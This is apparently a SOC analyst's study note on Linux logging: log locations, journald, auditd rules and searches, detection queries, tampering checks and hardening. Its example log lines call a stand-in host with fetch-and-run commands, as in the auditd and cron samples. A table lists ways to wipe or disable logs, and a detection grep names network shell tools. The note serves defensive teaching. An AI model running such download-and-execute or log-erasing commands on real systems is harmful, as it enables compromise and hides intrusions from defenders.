# Linux Logging — Study Notes

> Goal: know where Linux records what happened, how to query it fast, and how an attacker tries to erase it.
> Host internals → `Linux.md`; analysis method → `07 - Investigation/Log-Analysis.md`; shipping logs → `05 - SIEM/Log-Collection.md`.

---

## 0. How to use this note

1. §1–§3: why logging matters and how the stack fits together.
2. §4–§7: syslog, journald, auth logs, auditd — the four pillars.
3. §8–§11: kernel, applications, session records, rotation.
4. §12–§14: forwarding, integrity, tampering.
5. §15–§17: detection scenarios, investigation workflow, commands.
6. §18–§22: false positives, hardening, lab, self-test, revision.

If you only have 20 minutes: read §3 (paths), §5.3 (journalctl), §7.3 (ausearch), §13 (tampering).

---

## 1. Why Linux logging matters to a SOC

| Reality | Consequence |
|---|---|
| Most internet-facing infrastructure is Linux | Web, DNS, mail, containers, cloud VMs |
| Most cloud workloads are Linux | AWS/Azure/GCP default images |
| Attackers target auth and cron | Persistence lives in logs |
| Defaults are weak | No auditd, short retention, local-only logs |
| Containers log differently | stdout/stderr, no syslog inside |

**A Linux host with default logging tells you almost nothing. A configured host tells you everything.**

### 1.1 What SOC analysts actually ask

1. Who logged in, from where, and when?
2. Did they escalate to root?
3. What did they run?
4. Did they create users, cron jobs, or services?
5. Did they touch the logs?
6. Is the host still talking to something external?

Every section below serves one of those questions.

---

## 2. Logging architecture

```
+-------------------------------------------------------------+
|  Applications (sshd, sudo, nginx, cron, databases)          |
+-------------------------------------------------------------+
        |                |                    |
        v                v                    v
   /dev/log         stdout/stderr        own log files
        |                |                    |
        v                v                    |
+----------------+  +-----------+             |
|   journald     |  | container |             |
| (systemd)      |  | runtime   |             |
+----------------+  +-----------+             |
     |      |                                   |
     |      +--> /var/log/journal (binary)      |
     |                                          |
     v                                          v
+-------------------------------------------------------------+
|  syslog daemon: rsyslog / syslog-ng                         |
|  → /var/log/syslog, /var/log/auth.log, remote server        |
+-------------------------------------------------------------+

+-------------------------------------------------------------+
|  auditd  (kernel audit subsystem)                           |
|  → /var/log/audit/audit.log  (independent of syslog)        |
+-------------------------------------------------------------+

+-------------------------------------------------------------+
|  kernel ring buffer → dmesg → /var/log/kern.log             |
+-------------------------------------------------------------+
```

### 2.1 The four pillars

| Pillar | Answers | Where |
|---|---|---|
| **syslog** | App/service events, auth | `/var/log/syslog`, `/var/log/messages` |
| **journald** | Everything systemd units emit, structured | `journalctl`, `/var/log/journal/` |
| **auditd** | Syscall-level: exec, file access, identity changes | `/var/log/audit/audit.log` |
| **kernel ring** | Boot, hardware, OOM, modules | `dmesg`, `/var/log/kern.log` |

**Critical:** auditd is the only pillar that reliably records *what command ran*. syslog records *that sshd started a session*, not what the user typed.

---

## 3. Where logs live

### 3.1 Core paths

| Path | Contents | Typical distro |
|---|---|---|
| `/var/log/syslog` | General system messages | Debian/Ubuntu |
| `/var/log/messages` | General system messages | RHEL/CentOS/Fedora |
| `/var/log/auth.log` | Auth, sudo, su, sshd | Debian/Ubuntu |
| `/var/log/secure` | Auth, sudo, su, sshd | RHEL/CentOS |
| `/var/log/kern.log` | Kernel messages | Debian/Ubuntu |
| `/var/log/boot.log` | Boot-time service output | Many |
| `/var/log/dmesg` | Kernel ring snapshot at boot | Many |
| `/var/log/cron` | Cron execution | RHEL/CentOS |
| `/var/log/audit/audit.log` | Audit records | With auditd |
| `/var/log/journal/` | Binary journal | systemd |
| `/var/log/wtmp` | Successful logins (binary) | All |
| `/var/log/btmp` | Failed logins (binary) | All |
| `/var/log/lastlog` | Last login per user (binary) | All |
| `/var/log/faillog` | Failed auth counters (binary) | Some |
| `/var/log/nginx/` | Web access/error | nginx |
| `/var/log/apache2/` | Web access/error | Debian Apache |
| `/var/log/httpd/` | Web access/error | RHEL Apache |
| `/var/log/mail.log` | Mail | Debian |
| `/var/log/maillog` | Mail | RHEL |
| `/var/log/mysql/error.log` | Database | MySQL |
| `/var/log/dpkg.log` | Package installs (Debian) | Debian/Ubuntu |
| `/var/log/yum.log` | Package installs (RHEL) | RHEL |
| `/var/log/apt/history.log` | apt transactions | Debian/Ubuntu |

### 3.2 Per-user and app-local logs

| Path | Contents |
|---|---|
| `~/.bash_history` | Interactive shell commands |
| `~/.zsh_history` | zsh equivalent |
| `~/.ssh/authorized_keys` | Persistence vector |
| `/etc/passwd`, `/etc/shadow` | Account state |
| `/etc/sudoers`, `/etc/sudoers.d/` | Privilege config |
| `/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/` | Scheduled tasks |
| `/etc/systemd/system/`, `~/.config/systemd/user/` | Services |
| `/etc/rc.local`, `/etc/init.d/` | Legacy startup |
| `~/.config/autostart/` | Desktop autostart |
| `/var/log/` subdirs per app | Varies |

### 3.3 Quick discovery on an unknown host

```bash
ls -la /var/log/
ls -la /var/log/audit/ 2>/dev/null
journalctl --disk-usage
systemctl is-active rsyslog auditd systemd-journald
find /var/log -type f -name "*.log" -mtime -2 2>/dev/null | head -50
```

---

## 4. syslog

### 4.1 Message format (RFC 3164, classic)

```
Jan 12 03:14:07 web01 sshd[2411]: Failed password for invalid user admin from 203.0.113.9 port 51234 ssh2
```

| Field | Value |
|---|---|
| Timestamp | `Jan 12 03:14:07` (no year, local time) |
| Host | `web01` |
| Process | `sshd[2411]` |
| Message | Rest |

**Pitfall:** no year and often local time — always normalise to UTC and infer the year during investigations.

### 4.2 RFC 5424 (modern)

```
<34>1 2026-01-12T03:14:07.123Z web01 sshd 2411 ID47 - Failed password for root
```

Structured, ISO-8601 UTC, optional structured data. Prefer this when forwarding.

### 4.3 Facilities and severities

| Facility | Number | Use |
|---|---|---|
| kern | 0 | Kernel |
| user | 1 | User-level |
| mail | 2 | Mail |
| daemon | 3 | System daemons |
| auth | 4 | Authentication |
| syslog | 5 | Syslog itself |
| lpr | 6 | Printing |
| news | 7 | News |
| uucp | 8 | UUCP |
| cron | 9 | Cron |
| authpriv | 10 | Private auth |
| ftp | 11 | FTP |
| local0–local7 | 16–23 | Custom/apps |

| Severity | Number | Meaning |
|---|---|---|
| emerg | 0 | System unusable |
| alert | 1 | Immediate action |
| crit | 2 | Critical |
| err | 3 | Error |
| warning | 4 | Warning |
| notice | 5 | Normal but notable |
| info | 6 | Informational |
| debug | 7 | Debug |

**Detection use:** auth/authpriv at `err`/`warning` is where brute force and sudo failures live.

### 4.4 rsyslog rules

```conf
# /etc/rsyslog.conf or /etc/rsyslog.d/50-default.conf
auth,authpriv.*                 /var/log/auth.log
*.*;auth,authpriv.none          -/var/log/syslog
cron.*                          /var/log/cron.log
kern.*                          /var/log/kern.log
*.=debug                        /var/log/debug.log
```

- Leading `-` = don't fsync every write (faster, less crash-durable).
- `& stop` stops further processing (useful for dedup).

### 4.5 syslog-ng (equivalent idea)

```conf
source s_sys { system(); internal(); };
destination d_auth { file("/var/log/auth.log"); };
filter f_auth { facility(auth, authpriv); };
log { source(s_sys); filter(f_auth); destination(d_auth); };
```

### 4.6 Send a test message

```bash
logger -p auth.warning "SOC test message from $(hostname)"
tail -n 3 /var/log/auth.log
```

**Lab habit:** if you can't generate a log line on demand, you don't understand the pipeline yet.

---

## 5. journald

### 5.1 What it is

systemd's logging daemon. Captures stdout/stderr of units, kernel messages, and syslog. Stores **binary structured** records with searchable fields.

### 5.2 Storage modes

```ini
# /etc/systemd/journald.conf
[Journal]
Storage=persistent     # auto | volatile | persistent | none
SystemMaxUse=4G
SystemKeepFree=1G
MaxRetentionSec=90day
Compress=yes
ForwardToSyslog=yes
```

| Mode | Location | Survives reboot |
|---|---|---|
| `volatile` | `/run/log/journal` | No |
| `persistent` | `/var/log/journal` | Yes |
| `auto` | persistent if dir exists | Usually |

**Default on many systems is volatile — logs vanish on reboot.** Check this during hardening.

```bash
ls -d /var/log/journal 2>/dev/null || echo "VOLATILE - logs lost on reboot"
```

### 5.3 journalctl essentials

```bash
journalctl                          # all
journalctl -b                       # current boot
journalctl -b -1                    # previous boot
journalctl --list-boots             # boot history
journalctl -u ssh -n 50 --no-pager  # unit, last 50
journalctl -u ssh --since "2026-01-12 00:00" --until "2026-01-12 06:00"
journalctl --since "1 hour ago" -p err
journalctl -f                       # follow
journalctl -k                       # kernel only
journalctl _UID=0                   # root activity
journalctl _COMM=sudo
journalctl _PID=2411
journalctl -o json-pretty | head -1
journalctl --disk-usage
journalctl --vacuum-time=30d
journalctl --vacuum-size=1G
journalctl -xe                      # recent + explanations
```

### 5.4 Useful fields

| Field | Meaning |
|---|---|
| `_HOSTNAME` | Host |
| `_COMM` | Command name |
| `_EXE` | Executable path |
| `_PID`, `_PPID` | Process and parent |
| `_UID`, `_GID` | User/group |
| `_SYSTEMD_UNIT` | Unit |
| `_TRANSPORT` | `syslog`, `stdout`, `kernel`, `audit` |
| `SYSLOG_IDENTIFIER` | App tag |
| `PRIORITY` | Severity 0–7 |
| `MESSAGE` | Text |
| `_BOOT_ID` | Boot instance |

```bash
journalctl -o verbose _COMM=sudo | head -40
```

### 5.5 Finding gaps and tampering

```bash
journalctl --list-boots
journalctl --verify                  # integrity check
journalctl -b -1 --no-pager | head -5
```

- Missing boot IDs, `--verify` failures, or a sudden gap in a busy unit = investigate.
- An attacker with root can `journalctl --vacuum-*` or delete `/var/log/journal` outright.

---

## 6. Authentication logs

### 6.1 sshd — the highest-value lines

```
Accepted password for alice from 203.0.113.9 port 51234 ssh2
Accepted publickey for deploy from 198.51.100.7 port 40122 ssh2: ED25519 SHA256:...
Failed password for root from 203.0.113.9 port 51235 ssh2
Failed password for invalid user admin from 203.0.113.9 port 51236 ssh2
Invalid user oracle from 203.0.113.9 port 51237
Connection closed by authenticating user root 203.0.113.9 port 51238 [preauth]
Disconnected from invalid user test 203.0.113.9 port 51239 [preauth]
error: maximum authentication attempts exceeded for root from 203.0.113.9
Received disconnect from 203.0.113.9 port 51240:11: Bye Bye [preauth]
pam_unix(sshd:session): session opened for user alice by (uid=0)
pam_unix(sshd:session): session closed for user alice
```

| Line | Meaning |
|---|---|
| `Accepted password` | Interactive login with password |
| `Accepted publickey` | Key login (normal for automation) |
| `Failed password ... invalid user` | Username guessing |
| `Invalid user` | Nonexistent account tried |
| `maximum authentication attempts exceeded` | Brute force throttled |
| `session opened` / `closed` | Session boundaries |
| `Connection closed ... [preauth]` | Abort before auth (scan/probe) |

### 6.2 sudo and su

```
sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
sudo:   alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
su[3011]: pam_unix(su:session): session opened for user root by alice(uid=1000)
su[3011]: FAILED su for root by alice
```

**Hunt:** `USER=root ; COMMAND=/bin/bash` outside change windows; repeated incorrect attempts; `su` to root from a non-admin account.

### 6.3 User and group changes

```
useradd[3120]: new user: name=svcbackup, UID=1002, GID=1002, home=/home/svcbackup, shell=/bin/bash
usermod[3125]: add 'svcbackup' to group 'sudo'
groupadd[3130]: group added to /etc/group: name=admins, GID=1003
passwd[3140]: pam_unix(passwd:chauthtok): password changed for svcbackup
```

**Hunt:** new account then immediate sudo group add; UID 0 duplicate; password change on a dormant account.

### 6.4 PAM and privilege

- `pam_unix(...)` failure lines = authentication attempts.
- `pam_tally2` / `faillock` messages = lockouts.
- Missing PAM session lines for a login that has an `Accepted` line = suspicious.

---

## 7. auditd

### 7.1 Why auditd

| Question | auditd answer |
|---|---|
| What command ran? | `execve` records with full argv |
| Who read `/etc/shadow`? | File watch record |
| Who changed sudoers? | `PATH`/`SYSCALL` record |
| Which process connected out? | `connect` syscall (with rules) |
| Who deleted audit rules? | `CONFIG_CHANGE` |

**auditd is the closest thing Linux has to EDR process telemetry.**

### 7.2 Essential rules

```bash
# /etc/audit/rules.d/soc.rules
# Identity and privilege changes
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/sudoers -p wa -k privilege
-w /etc/sudoers.d/ -p wa -k privilege

# Execution
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec

# Persistence
-w /etc/cron.d/ -p wa -k cron
-w /etc/crontab -p wa -k cron
-w /var/spool/cron/ -p wa -k cron
-w /etc/systemd/system/ -p wa -k service
-w /etc/rc.local -p wa -k startup

# Log tampering
-w /var/log/ -p wa -k log_tamper
-w /etc/audit/ -p wa -k audit_config
-w /etc/audit/rules.d/ -p wa -k audit_config

# Network and modules
-a always,exit -F arch=b64 -S init_module,finit_module -k module_load
-w /etc/ssh/sshd_config -p wa -k ssh_config
```

```bash
augenrules --load
auditctl -l          # list loaded rules
systemctl restart auditd
```

**Caveat:** `execve` auditing is high-volume. On busy hosts, scope it or ship to a SIEM with filtering.

### 7.3 Searching

```bash
ausearch -k identity -i
ausearch -k exec -ts today -i
ausearch -ua 1000 -ts recent -i
ausearch -m USER_LOGIN,USER_AUTH -i
ausearch -f /etc/passwd -i
ausearch -c sudo -i
ausearch -k exec -ts yesterday | aureport -f -i
```

| Flag | Meaning |
|---|---|
| `-k` | Key (rule tag) |
| `-m` | Message type |
| `-ua` | User ID (audit UID) |
| `-f` | File |
| `-c` | Command |
| `-ts`/`-te` | Start/end time |
| `-i` | Interpret numeric IDs to names |
| `-w` | Watch path |

### 7.4 Reading a record

```
type=SYSCALL msg=audit(1768187647.123:4521): arch=c000003e syscall=59 success=yes
  exit=0 a0=55d2... a1=55d2... a2=55d2... a3=8
  items=2 ppid=1201 pid=4522 auid=1000 uid=0 gid=0 euid=0
  tty=pts0 ses=3 comm="bash" exe="/usr/bin/bash" key="exec"
type=EXECVE msg=audit(1768187647.123:4521): argc=3 a0="bash" a1="-c" a2="wget http://evil.example/x.sh -O /tmp/x"
type=CWD   msg=audit(1768187647.123:4521): cwd="/home/alice"
type=PATH  msg=audit(1768187647.123:4521): item=0 name="/usr/bin/bash" ...
```

| Field | Meaning |
|---|---|
| `auid` | Original login UID (survives `su`/`sudo`) |
| `uid`/`euid` | Effective user at execution |
| `ses` | Session ID (link events together) |
| `tty` | Terminal |
| `comm`/`exe` | Binary name/path |
| `argc`/`a0..` | Full command arguments |
| `cwd` | Working directory |
| `key` | Rule tag |

**`auid` is gold:** `auid=1000 uid=0` = user alice escalated to root. If `auid=4294967295` (unset), the process was not tied to a login session — common for services, also for some evasion.

### 7.5 Reports

```bash
aureport --summary
aureport -au --summary        # auth events
aureport -l                   # logins
aureport -f                   # files
aureport -x --summary         # executables
aureport -m --summary         # modules
aureport -ts today -tm now
```

### 7.6 Auditing the auditor

```bash
auditctl -s                    # status: enabled, failure mode, backlog
cat /etc/audit/auditd.conf     # space_left_action, max_log_file_action
ausearch -m CONFIG_CHANGE -i
```

**Signs of tampering:** `auditctl -s` shows `enabled 0`; rules list is empty; `CONFIG_CHANGE` records with `audit_enabled=0`; audit log truncated or rotated oddly.

---

## 8. Kernel and boot logs

| Command/file | Contents |
|---|---|
| `dmesg` | Kernel ring buffer |
| `dmesg -T` | Human timestamps |
| `dmesg -w` | Follow |
| `dmesg -l err,crit` | Errors only |
| `/var/log/kern.log` | Persisted kernel messages |
| `/var/log/boot.log` | Service start output |
| `journalctl -k` | Kernel via journal |

### 8.1 High-value kernel messages

| Message | Meaning |
|---|---|
| `Out of memory: Killed process` | OOM kill (could be DoS or resource abuse) |
| `module verification failed` | Unsigned kernel module |
| `tainted kernel` | Module or crash tainted kernel |
| `USB disconnect` / storage | Physical access |
| `EXT4-fs error` | Filesystem damage |
| `segfault at ... ip ...` | Crash or memory exploit attempt |
| `promiscuous mode` | Interface in sniffing mode |
| `TCP: request_sock_TCP: Possible SYN flooding` | DoS |
| `nf_conntrack: table full` | Connection exhaustion |
| `iptables` / `nftables` changes | Firewall modification |

```bash
dmesg -T | grep -Ei "oom|segfault|taint|module|promisc|flood"
journalctl -k -b -1 | tail -50
```

---

## 9. Application logs

### 9.1 Web servers

```
203.0.113.9 - alice [12/Jan/2026:03:14:07 +0000] "GET /admin.php?id=1%27 HTTP/1.1" 500 512 "-" "sqlmap/1.7"
```

| Field | Use |
|---|---|
| Client IP | Source; check for proxies |
| User | Auth user or `-` |
| Timestamp | UTC offset aware |
| Request | Method, path, query (injection signals) |
| Status | 200 success, 401/403 probing, 500 errors |
| Bytes | Exfil/anomaly |
| Referer | Chain context |
| User-Agent | Tool fingerprint |

**Hunt patterns:** many 404s then a 200; `sqlmap`, `nikto`, `nmap`, `curl` UA; `.env`, `/wp-login.php`, `/phpmyadmin`; huge response sizes; 401 bursts.

```bash
awk '$9==404' /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
grep -E "sqlmap|nikto|nmap|masscan" /var/log/nginx/access.log | head
```

### 9.2 Cron

```
CRON[4100]: (root) CMD (curl -s http://evil.example/x.sh | bash)
CRON[4101]: (alice) CMD (/home/alice/.cache/upd >/dev/null 2>&1)
```

**Hunt:** `curl|bash`, `wget` to `/tmp`, base64, `sh -c`, new jobs on `* * * * *`, entries in `/var/spool/cron/crontabs/`.

### 9.3 Mail, database, containers

| Source | Signal |
|---|---|
| Mail (`maillog`) | Auth failures, relay abuse, spam volume |
| MySQL/Postgres | Failed logins, `LOAD_FILE`, `INTO OUTFILE` |
| Docker | `docker logs`, container restarts, privileged runs |
| Kubernetes | stdout/stderr, `kubectl logs`, audit log |

**Containers:** logs go to stdout/stderr captured by the runtime. Inside a container there is often no syslog. Ship via the runtime, not from inside.

---

## 10. Session records: wtmp, btmp, last

### 10.1 The binary files

| File | Contents | Commands |
|---|---|---|
| `/var/log/wtmp` | Successful logins | `last`, `who -a` |
| `/var/log/btmp` | Failed logins | `lastb` |
| `/var/log/lastlog` | Last login per user | `lastlog` |
| `/var/run/utmp` | Current sessions | `who`, `w`, `users` |

### 10.2 Usage

```bash
last -a | head -20
last -f /var/log/wtmp.1
lastb | head -20
lastlog
who -a
w
who --ips
```

**Why it matters:** `last` shows *sessions* even when `auth.log` was rotated or truncated. An attacker deleting `auth.log` does not automatically clean `wtmp`.

### 10.3 Remote vs local

`last` output columns include source host/IP for remote logins and `:0`/`tty1` for console. A gap between `last` and `auth.log` is a finding.

---

## 11. Rotation and retention

### 11.1 logrotate

```conf
# /etc/logrotate.d/soc
/var/log/auth.log {
    daily
    rotate 90
    compress
    delaycompress
    missingok
    notifempty
    create 0640 root adm
    sharedscripts
    postrotate
        systemctl reload rsyslog >/dev/null 2>&1 || true
    endscript
}
```

| Directive | Meaning |
|---|---|
| `rotate N` | Keep N old files |
| `daily/weekly` | Frequency |
| `compress` | gzip old files |
| `delaycompress` | Keep newest old file plain |
| `create MASK OWNER GROUP` | Recreate after rotate |
| `copytruncate` | Copy then truncate (use when app can't reopen) |
| `maxsize` | Force rotate on size |

### 11.2 Retention realities

- Rotation + compression + 90 days is a reasonable baseline.
- 30 days is common and often **too short** for dwell time.
- Ransomware often deletes local logs — retention only helps if shipped.
- Check: `ls /var/log/*.gz | head`, `grep -R "rotate" /etc/logrotate.d/`

### 11.3 Verify rotation actually runs

```bash
cat /var/lib/logrotate/status 2>/dev/null | head -20
logrotate -d /etc/logrotate.conf 2>&1 | head -40   # debug, no changes
```

**Broken rotation = full disk = logging stops silently.** Check disk too:

```bash
df -h /var
du -sh /var/log/* 2>/dev/null | sort -h | tail -10
```

---

## 12. Centralised forwarding

### 12.1 Why

| Risk | Mitigation |
|---|---|
| Attacker deletes local logs | Remote copy survives |
| Disk fills, logs lost | Central retention |
| Many hosts | Single query point |
| Compliance | Immutable central store |

### 12.2 rsyslog client → server (TLS recommended)

```conf
# client: /etc/rsyslog.d/90-remote.conf
*.* @@siem.example.com:6514

# or with TLS
$DefaultNetstreamDriverCAFile /etc/rsyslog.d/ca.pem
$ActionSendStreamDriver gtls
$ActionSendStreamDriverMode 1
$ActionSendStreamDriverAuthMode x509/name
$ActionSendStreamDriverPermittedPeer siem.example.com
*.* @@siem.example.com:6514
```

```conf
# server: /etc/rsyslog.d/10-listen.conf
module(load="imtcp" StreamDriver.Name="gtls" StreamDriver.Mode="1")
input(type="imtcp" port="6514")
template(name="perhost" type="string" string="/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log")
*.* ?perhost
```

### 12.3 journald forwarding

```ini
# /etc/systemd/journald.conf
ForwardToSyslog=yes
ForwardToWall=no
```

Or use `systemd-journal-upload` / `systemd-journal-remote` for native journal shipping.

### 12.4 auditd forwarding

Use `audispd`/`audisp-remote`:

```ini
# /etc/audit/plugins.d/au-remote.conf
active = yes
direction = out
path = /sbin/audisp-remote
type = always
format = string
```

```conf
# /etc/audit/audisp-remote.conf
remote_server = siem.example.com
port = 60
transport = TCP
```

### 12.5 Agent-based (Wazuh, Elastic, Fluent Bit)

| Tool | Reads |
|---|---|
| Wazuh agent | journald, syslog, auditd, files |
| Elastic Agent | journald, files, auditd, osquery |
| Fluent Bit/Fluentd | files, journald, container stdout |
| osquery | System state + some logs |

Details → `05 - SIEM/Log-Collection.md`.

### 12.6 Forwarding checklist

- [ ] TLS enabled and verified
- [ ] Clock synced (chrony/systemd-timesyncd)
- [ ] Hostname stable and unique
- [ ] Test message arrives centrally
- [ ] Buffer/queue configured (no loss on network blip)
- [ ] Remote retention ≥ local retention
- [ ] Central store write-once or access-controlled

---

## 13. Integrity and tampering

### 13.1 What attackers do

| Technique | Effect |
|---|---|
| `rm /var/log/*` | Deletes evidence |
| Truncate with `> file` | Empties without deleting |
| `sed -i` on logs | Edits specific lines |
| Stop rsyslog/journald | Stops new records |
| `auditctl -e 0` | Disables audit |
| Delete audit rules | Removes visibility |
| Clear `~/.bash_history` | Removes commands |
| `unset HISTFILE` / `HISTCONTROL` | Stops history |
| Timestomp | Alters mtime/atime |
| Bind-mount over log dir | Hides content |

### 13.2 Detect tampering

```bash
# audit log gaps
ausearch -m CONFIG_CHANGE -i | tail -20

# services down
systemctl status rsyslog auditd systemd-journald

# missing log window
last -F | head; grep "session opened" /var/log/auth.log | head

# history cleared
ls -la ~/.bash_history ~/.zsh_history
wc -l ~/.bash_history

# suspicious shell settings
grep -rE "HISTFILE|HISTSIZE|HISTCONTROL|unset HIST" /etc/profile /etc/bash.bashrc /etc/profile.d/ 2>/dev/null

# immutable/append-only attributes
lsattr /var/log/auth.log /var/log/audit/audit.log 2>/dev/null
```

| Attribute | Meaning |
|---|---|
| `a` | Append-only (cannot overwrite/delete) |
| `i` | Immutable (cannot modify at all) |
| `e` | Extent format |

### 13.3 Protect logs

```bash
chattr +a /var/log/audit/audit.log
chattr +i /etc/audit/rules.d/soc.rules
```

**Caveat:** root can `chattr -a`, so this is speed-bump, not prevention. Real protection is remote shipping.

### 13.4 Permission review

```bash
ls -l /var/log/auth.log /var/log/secure /var/log/audit/audit.log
stat -c '%a %U:%G %n' /var/log/auth.log
```

Expected: `640 root:adm` (Debian) or `600 root:root` (RHEL audit). World-readable auth logs = finding.

---

## 14. Detection scenarios

### 14.1 SSH brute force

```bash
grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn | head
grep "Failed password" /var/log/auth.log | grep -c "$(date +%b\ %e)"
```

Splunk:

```spl
index=linux sourcetype=linux_secure "Failed password"
| rex "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count dc(user) AS users values(user) BY src_ip
| where count > 20
```

### 14.2 Success after failures (password spray)

```spl
index=linux sourcetype=linux_secure
| rex "Failed password for (invalid user )?(?<user>\S+) from (?<src_ip>\S+)"
| rex "Accepted \S+ for (?<ok_user>\S+) from (?<ok_ip>\S+)"
| stats count(eval(isnotnull(user))) AS fails count(eval(isnotnull(ok_user))) AS succ BY src_ip
| where fails > 10 AND succ > 0
```

### 14.3 New privileged account

```bash
grep -E "new user|add .* to group '?(sudo|wheel|adm)" /var/log/auth.log
grep -E "useradd|usermod" /var/log/audit/audit.log
awk -F: '$3==0 {print}' /etc/passwd
```

### 14.4 Suspicious command execution

```bash
ausearch -k exec -i | grep -Ei "curl|wget|base64|nc |ncat|socat|/dev/tcp|python -c|perl -e|chmod \+x|history -c"
```

### 14.5 Persistence

```bash
crontab -l; ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-unit-files --state=enabled | head -30
ls -la /etc/systemd/system/ ~/.config/systemd/user/ 2>/dev/null
cat /etc/rc.local 2>/dev/null
grep -R "curl\|wget\|base64" /etc/cron* /var/spool/cron 2>/dev/null
```

### 14.6 Log tampering

```bash
journalctl --verify
systemctl is-active auditd rsyslog
auditctl -s
ausearch -m CONFIG_CHANGE -i
find /var/log -newermt "-1 hour" -type f -ls
```

### 14.7 Outbound connection

```bash
ss -tunap | grep -v "127.0.0.1"
journalctl -k | grep -i "promisc"
ausearch -m SYSCALL -sc connect -i 2>/dev/null | tail -20
```

---

## 15. Investigation workflow for a Linux host

```
1. Identify host role and exposure
2. Confirm clock and timezone (UTC?)
3. Establish log availability and gaps
4. Pull auth events: logins, sudo, su, new users
5. Pull execution evidence: auditd execve, bash_history
6. Check persistence: cron, systemd, rc, ssh keys
7. Check network: listeners, connections, DNS
8. Check integrity: log deletion, history cleared, audit disabled
9. Build timeline in UTC
10. Scope: same creds/IP/hash elsewhere
11. Contain, then preserve evidence
12. Document findings and gaps
```

### 15.1 Evidence order

| Priority | Item |
|---|---|
| 1 | Volatile: processes, connections, memory |
| 2 | Logs (copy before rotate/delete) |
| 3 | `auth.log`, `wtmp`, `audit.log` |
| 4 | Shell history, cron, systemd units |
| 5 | Files with recent mtime |
| 6 | Package/install history |

```bash
# quick triage bundle (read-only)
mkdir -p /tmp/ir-$(hostname)-$(date +%s)
{ last -a; lastb; who -a; ss -tunap; ps auxf; } > /tmp/ir-bundle.txt 2>&1
```

**Copy logs with hashes before touching them:**

```bash
tar czf /tmp/logs.tgz /var/log/auth.log /var/log/audit/audit.log /var/log/wtmp 2>/dev/null
sha256sum /tmp/logs.tgz
```

---

## 16. Triage playbook (fast reference)

| Question | Command |
|---|---|
| Who logged in? | `last -a`, `journalctl -u ssh`, `ausearch -m USER_LOGIN -i` |
| Who failed? | `lastb`, `grep "Failed password" /var/log/auth.log` |
| Who escalated? | `grep sudo /var/log/auth.log`, `ausearch -k privilege -i` |
| What ran? | `ausearch -k exec -i`, `~/.bash_history` |
| New users? | `grep "new user" /var/log/auth.log`, `diff /etc/passwd*` |
| Persistence? | cron, systemd, rc.local, authorized_keys |
| Logs deleted? | `journalctl --verify`, file mtimes, audit gaps |
| Audit off? | `auditctl -s` |
| Talking out? | `ss -tunap`, `journalctl -k` |
| Container escapes? | `docker ps`, privileged flags, mounts |

---

## 17. Commands cheat sheet

### Search

```bash
grep -i "failed" /var/log/auth.log
grep -E "Accepted|Failed" /var/log/auth.log | tail -20
zgrep "Failed password" /var/log/auth.log.2.gz
rg -i "sudo" /var/log/           # ripgrep, fast
awk '/Failed password/ {print $11}' /var/log/auth.log | sort -u
```

### Time-windowed

```bash
journalctl --since "2026-01-12 00:00" --until "2026-01-12 12:00"
sed -n '/Jan 12 03:/,/Jan 12 04:/p' /var/log/auth.log
ausearch -ts 01/12/2026 00:00:00 -te 01/12/2026 12:00:00 -i
last -F -s yesterday
```

### Count and rank

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
grep -c "Accepted" /var/log/auth.log
cut -d' ' -f1 /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -10
```

### System state

```bash
uname -a; cat /etc/os-release
uptime; who -a; w
ps auxf | head -40
ss -tunap
lsof -i -P -n | head
systemctl list-units --failed
```

### Packages

```bash
grep -i " install " /var/log/dpkg.log | tail -20
grep -i "install" /var/log/apt/history.log | tail -20
rpm -qa --last | head -20
```

---

## 18. False positives

| Look | Could be |
|---|---|
| Repeated `Failed password` | Misconfigured automation, expired key |
| Many `Accepted publickey` | Config management (Ansible, Puppet) |
| `sudo ... COMMAND=/bin/bash` | Legit admin shell |
| New user + sudo | Onboarding by IT |
| `curl` in cron | Monitoring/backup job |
| Log rotation gap | logrotate/maxsize behaviour |
| `auditctl -s` disabled | Hardened image with audit off by design |
| History empty | Container or `HISTFILE` unset in profile |
| Outbound on 443 | Package updates, telemetry |

**Always map to a change ticket, an owner, and a baseline before escalating.**

---

## 19. Hardening recommendations

| Control | Setting |
|---|---|
| Persistent journal | `Storage=persistent`, `SystemMaxUse` |
| Retention | ≥90 days locally, ≥1 year centrally |
| Remote shipping | TLS rsyslog or agent, queued |
| auditd | Rules for identity, exec, persistence, audit config |
| auditd failure mode | `failure_mode=1` (log to syslog) or `2` (panic, high-security only) |
| Permissions | `640 root:adm` auth logs; `600` audit |
| Immutability | `chattr +a` audit log (speed bump) |
| Clock | chrony/systemd-timesyncd, UTC |
| Logrotate | daily, 90 rotations, compress, create |
| Shell history | `HISTTIMEFORMAT`, `HISTSIZE`, append |
| Monitoring | Alert on audit down, rsyslog down, log volume drop |
| Disk | Alert at 80% on `/var` |

```bash
# history with timestamps, for all users
echo 'export HISTTIMEFORMAT="%F %T "' >> /etc/profile.d/history.sh
echo 'shopt -s histappend' >> /etc/profile.d/history.sh
```

---

## 20. Lab plan

### 20.1 Baseline (1 hour)

1. On a Debian/Ubuntu VM, list every file in `/var/log` with sizes.
2. `journalctl --disk-usage`; check whether `/var/log/journal` exists.
3. `systemctl is-active rsyslog auditd`; enable auditd.
4. `logger -p auth.warning "test"`; find it in `auth.log`.

### 20.2 Auth simulation (1 hour)

1. Create user `labuser`.
2. Add a fake failed-login line? **No** — instead SSH to yourself with a bad password 10 times.
3. Find the failures in `auth.log` and `lastb`.
4. `sudo -l` as `labuser`; find the sudo entries.
5. Add `labuser` to `sudo`; find the group change.

### 20.3 auditd (1.5 hours)

1. Install auditd; add the rules from §7.2 (start with identity + cron only).
2. `augenrules --load`; `auditctl -l`.
3. `touch /etc/cron.d/test`; `ausearch -k cron -i`.
